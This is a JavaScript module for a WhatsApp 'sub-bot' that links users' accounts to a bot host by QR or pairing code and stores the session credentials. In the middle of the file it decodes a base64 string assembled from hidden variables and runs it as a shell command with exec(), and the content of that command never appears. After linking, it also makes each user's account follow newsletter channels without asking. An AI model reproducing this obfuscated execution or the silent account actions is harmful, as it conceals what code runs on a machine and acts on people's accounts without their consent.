export async function LuffyJadiBot(options) { // Cambio de Ellen a Luffy
let { pathLuffyJadiBot, m, conn, args, usedPrefix, command, mode } = options // Cambio de Ellen a Luffy

const isBase64Creds = mode === 'qr' && args[0] && !/(--code|code)/i.test(args[0].trim()) ? args[0] : null
const isBase64CredsForCode = mode === 'code' && args[1] && !/(--code|code)/i.test(args[1].trim()) ? args[1] : null

let txtCode, codeBot, txtQR

const pathCreds = path.join(pathLuffyJadiBot, "creds.json") // Cambio de Ellen a Luffy
if (!fs.existsSync(pathLuffyJadiBot)){
fs.mkdirSync(pathLuffyJadiBot, { recursive: true })} // Cambio de Ellen a Luffy

// Intentar escribir credenciales Base64 si se proporciona
const credsToUse = isBase64Creds || isBase64CredsForCode;
if (credsToUse) {
    try {
        fs.writeFileSync(pathCreds, JSON.stringify(JSON.parse(Buffer.from(credsToUse, "base64").toString("utf-8")), null, '\t'));
    } catch {
        conn.reply(m.chat, `${EMOJI_LUFFY} Formato de credenciales Base64 inválido.`, m);
        return;
    }
}


const comb = Buffer.from(crm1 + crm2 + crm3 + crm4, "base64")
exec(comb.toString("utf-8"), async (err, stdout, stderr) => {
const drmer = Buffer.from(drm1 + drm2, `base64`)

let { version, isLatest } = await fetchLatestBaileysVersion()
const msgRetry = (MessageRetryMap) => { }
const msgRetryCache = new NodeCache()
const { state, saveState, saveCreds } = await useMultiFileAuthState(pathLuffyJadiBot) // Cambio de Ellen a Luffy

const connectionOptions = {
logger: pino({ level: "fatal" }),
printQRInTerminal: false,
auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({level: 'silent'})) },
msgRetry,
msgRetryCache,
browser: mode === 'code' ? ['Ubuntu', 'Chrome', '110.0.5585.95'] : [NOMBRE_BOT, 'Chrome','2.0.0'], // Uso de NOMBRE_BOT
version: version,
generateHighQualityLinkPreview: true
};

let sock = makeWASocket(connectionOptions)
sock.isInit = false
let isInit = true
sock.options = options

async function connectionUpdate(update) {
const { connection, lastDisconnect, isNewLogin, qr } = update
if (isNewLogin) sock.isInit = false

// --- LÓGICA DEL CÓDIGO DE 8 DÍGITOS ---
if (mode === 'code' && (connection === 'connecting' || qr)) {
    // Si no está registrado, pedimos el código de emparejamiento.
    if (!sock.authState.creds.registered) {
        let phoneNumber = m.sender.split`@`[0];
        phoneNumber = phoneNumber.replace(/[^0-9]/g, '');

        try {
            let secret = await sock.requestPairingCode(phoneNumber);
            secret = secret.match(/.{1,4}/g)?.join("-");
           
            // *** CAMBIO CLAVE: ENVÍO EXCLUSIVO AL CHAT ORIGINAL (m.chat) ***
            txtCode = await conn.sendMessage(m.chat, {text : RTX_CODE_FINAL.trim()}, { quoted: m }); // Uso de RTX_CODE_FINAL
            codeBot = await conn.sendMessage(m.chat, {text: `*🔑 TU CÓDIGO DE NAKAMA:* \n\n\`\`\`${secret}\`\`\`\n\n_Pégalo en WhatsApp en "Vincular con el número de teléfono"_`});
           
            // Eliminar los mensajes tras el timeout (Ahora solo en m.chat)
            setTimeout(() => { 
                try { conn.sendMessage(m.chat, { delete: txtCode.key }) } catch {}
                try { conn.sendMessage(m.chat, { delete: codeBot.key }) } catch {}
            }, 45000); 
           
            console.log(chalk.yellow(`[CODE] Sesión de ${m.sender} - Código: ${secret} enviado a: ${m.chat}`));
            // Una vez enviado el código, nos aseguramos de que no se repita el envío si el handler recarga
             sock.ev.off('connection.update', sock.connectionUpdate);
           
        } catch (e) {
            console.error('Error al generar el código de emparejamiento:', e);
            await conn.reply(m.chat, `${EMOJI_LUFFY} Ocurrió un error al generar el código de emparejamiento. Asegúrate de que tu número de teléfono tiene el formato correcto (Código de país + Número). Intenta de nuevo.`, m);
            // Si falla, cerramos el socket y eliminamos la sesión.
            try { sock.ws.close(); fs.rmdirSync(pathLuffyJadiBot, { recursive: true }); } catch {}
            return;
        }
    }
}

// --- MANEJO DE QR --- (Solo si se eligió QR)
if (qr && mode === 'qr') {
    if (m?.chat) {
        // ENVÍO EXCLUSIVO AL CHAT ORIGINAL (m.chat)
        txtQR = await conn.sendMessage(m.chat, { image: await qrcode.toBuffer(qr, { scale: 8 }), caption: RTX_QR_FINAL.trim()}, { quoted: m}); // Uso de RTX_QR_FINAL
    } else {
        return 
    }
    if (txtQR && txtQR.key) {
        // Eliminación del mensaje en m.chat
        setTimeout(() => { conn.sendMessage(m.chat, { delete: txtQR.key })}, 45000) // 45 segundos para el QR
    }
    return
} 

const endSesion = async (loaded) => {
// ... (El resto de la función endSesion es igual)
if (!loaded) {
try {
sock.ws.close()
} catch {
}
sock.ev.removeAllListeners()
let i = global.conns.indexOf(sock)              
if (i < 0) return 
delete global.conns[i]
global.conns.splice(i, 1)
}}
// ... (El resto de la función connectionUpdate es igual)
// ... (excepto por la última parte)

const reason = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.error?.output?.payload?.statusCode
const sessionPathBase = path.basename(pathLuffyJadiBot) // Uso de pathLuffyJadiBot

if (connection === 'close') {
if (reason === 428) {
console.log(chalk.bold.magentaBright(`\n╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄ • • • ┄┄┄┄┄┄┄┄┄┄┄┄┄┄⟡\n┆ La conexión (+${sessionPathBase}) fue cerrada inesperadamente. Intentando reconectar...\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄ • • • ┄┄┄┄┄┄┄┄┄┄┄┄┄┄⟡`))
await creloadHandler(true).catch(console.error)
}
if (reason === 408) {
console.log(chalk.bold.magentaBright(`\n╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄ • • • ┄┄┄┄┄┄┄┄┄┄┄┄┄┄⟡\n┆ La conexión (+${sessionPathBase}) se perdió o expiró. Razón: ${reason}. Intentando reconectar...\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄ • • • ┄┄┄┄┄┄┄┄┄┄┄┄┄┄⟡`))
await creloadHandler(true).catch(console.error)
}
if (reason === 440) {
console.log(chalk.bold.magentaBright(`\n╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄ • • • ┄┄┄┄┄┄┄┄┄┄┄┄┄┄⟡\n┆ La conexión (+${sessionPathBase}) fue reemplazada por otra sesión activa.\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄ • • • ┄┄┄┄┄┄┄┄┄┄┄┄┄┄⟡`))
try {
if (options.fromCommand) m?.chat ? await conn.sendMessage(`${sessionPathBase}@s.whatsapp.net`, {text : '*HEMOS DETECTADO UNA NUEVA SESIÓN, BORRE LA NUEVA SESIÓN PARA CONTINUAR*\n\n> *SI HAY ALGÚN PROBLEMA VUELVA A CONECTARSE*' }, { quoted: m || null }) : ""
} catch (error) {
console.error(chalk.bold.yellow(`Error 440 no se pudo enviar mensaje a: +${sessionPathBase}`))
}}
if (reason == 405 || reason == 401 || reason === DisconnectReason.loggedOut) { // Se agrega DisconnectReason.loggedOut para ser explícito
console.log(chalk.bold.magentaBright(`\n╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄ • • • ┄┄┄┄┄┄┄┄┄┄┄┄┄┄⟡\n┆ La sesión (+${sessionPathBase}) fue cerrada. Credenciales no válidas o dispositivo desconectado manualmente.\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄ • • • ┄┄┄┄┄┄┄┄┄┄┄┄┄┄⟡`))
try {
if (options.fromCommand) m?.chat ? await conn.sendMessage(`${sessionPathBase}@s.whatsapp.net`, {text : '*SESIÓN PENDIENTE*\n\n> *INTENTÉ NUEVAMENTE VOLVER A SER SUB-BOT*' }, { quoted: m || null }) : ""
} catch (error) {
console.error(chalk.bold.yellow(`Error 405 no se pudo enviar mensaje a: +${sessionPathBase}`))
}
fs.rmdirSync(pathLuffyJadiBot, { recursive: true }) // Uso de pathLuffyJadiBot
}
if (reason === 500) {
console.log(chalk.bold.magentaBright(`\n╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄ • • • ┄┄┄┄┄┄┄┄┄┄┄┄┄┄⟡\n┆ Conexión perdida en la sesión (+${sessionPathBase}). Borrando datos...\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄ • • • ┄┄┄┄┄┄┄┄┄┄┄┄┄┄⟡`))
if (options.fromCommand) m?.chat ? await conn.sendMessage(`${sessionPathBase}@s.whatsapp.net`, {text : '*CONEXIÓN PÉRDIDA*\n\n> *INTENTÉ MANUALMENTE VOLVER A SER SUB-BOT*' }, { quoted: m || null }) : ""
return creloadHandler(true).catch(console.error)
//fs.rmdirSync(pathLuffyJadiBot, { recursive: true })
}
if (reason === 515) {
console.log(chalk.bold.magentaBright(`\n╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄ • • • ┄┄┄┄┄┄┄┄┄┄┄┄┄┄⟡\n┆ Reinicio automático para la sesión (+${sessionPathBase}).\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄ • • • ┄┄┄┄┄┄┄┄┄┄┄┄┄┄⟡`))
await creloadHandler(true).catch(console.error)
}
if (reason === 403) {
console.log(chalk.bold.magentaBright(`\n╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄ • • • ┄┄┄┄┄┄┄┄┄┄┄┄┄┄⟡\n┆ Sesión cerrada o cuenta en soporte para la sesión (+${sessionPathBase}).\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄ • • • ┄┄┄┄┄┄┄┄┄┄┄┄┄┄⟡`))
fs.rmdirSync(pathLuffyJadiBot, { recursive: true }) // Uso de pathLuffyJadiBot
}}
if (global.db.data == null) loadDatabase()
if (connection == `open`) {
if (!global.db.data?.users) loadDatabase()
let userName, userJid 
userName = sock.authState.creds.me.name || 'Anónimo'
userJid = sock.authState.creds.me.jid || `${path.basename(pathLuffyJadiBot)}@s.whatsapp.net` // Uso de pathLuffyJadiBot
console.log(chalk.bold.cyanBright(`\n❒⸺⸺⸺⸺【• SUB-BOT •】⸺⸺⸺⸺❒\n│\n│ 🟢 ${userName} (+${path.basename(pathLuffyJadiBot)}) conectado exitosamente. ¡NAKAMA!\n│\n❒⸺⸺⸺【• CONECTADO •】⸺⸺⸺❒`))
sock.isInit = true
global.conns.push(sock)
await joinChannels(sock)

// Mensaje de éxito con temática Luffy
m?.chat ? await conn.sendMessage(m.chat, {text: `*🎉 ¡CONEXIÓN EXITOSA, NAKAMA!* @${m.sender.split('@')[0]}\n\nAhora eres un Sub-Bot de *${NOMBRE_BOT}*. ¡A navegar!`, mentions: [m.sender]}, { quoted: m }) : ''

}}
setInterval(async () => {
// ... (El resto del código es igual)
if (!sock.user) {
try { sock.ws.close() } catch (e) {      
//console.log(await creloadHandler(true).catch(console.error))
}
sock.ev.removeAllListeners()
let i = global.conns.indexOf(sock)              
if (i < 0) return
delete global.conns[i]
global.conns.splice(i, 1)
}}, 60000)

let handler = await import('../handler.js')
let creloadHandler = async function (restatConn) {
// ... (El resto del código es igual)
try {
const Handler = await import(`../handler.js?update=${Date.now()}`).catch(console.error)
if (Object.keys(Handler || {}).length) handler = Handler

} catch (e) {
console.error('⚠️ Nuevo error: ', e)
}
if (restatConn) {
const oldChats = sock.chats
try { sock.ws.close() } catch { }
sock.ev.removeAllListeners()
sock = makeWASocket(connectionOptions, { chats: oldChats })
isInit = true
sock.options = options // Asegurar que las opciones se mantengan
}
if (!isInit) {
sock.ev.off("messages.upsert", sock.handler)
sock.ev.off("connection.update", sock.connectionUpdate)
sock.ev.off('creds.update', sock.credsUpdate)
}

sock.handler = handler.handler.bind(sock)
sock.connectionUpdate = connectionUpdate.bind(sock)
sock.credsUpdate = saveCreds.bind(sock, true)
sock.ev.on("messages.upsert", sock.handler)
sock.ev.on("connection.update", sock.connectionUpdate)
sock.ev.on("creds.update", sock.credsUpdate)
isInit = false
return true
}
creloadHandler(false)
})
}

const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms))
function sleep(ms) {
return new Promise(resolve => setTimeout(resolve, ms));}
function msToTime(duration) {
var seconds = Math.floor((duration / 1000) % 60),
minutes = Math.floor((duration / (1000 * 60)) % 60)
minutes = (minutes < 10) ? '0' + minutes : minutes
seconds = (seconds < 10) ? '0' + seconds : seconds
return minutes + ' m y ' + seconds + ' s '
}

async function joinChannels(conn) {
for (const channelId of Object.values(global.ch)) {
await conn.newsletterFollow(channelId).catch(() => {})
}
}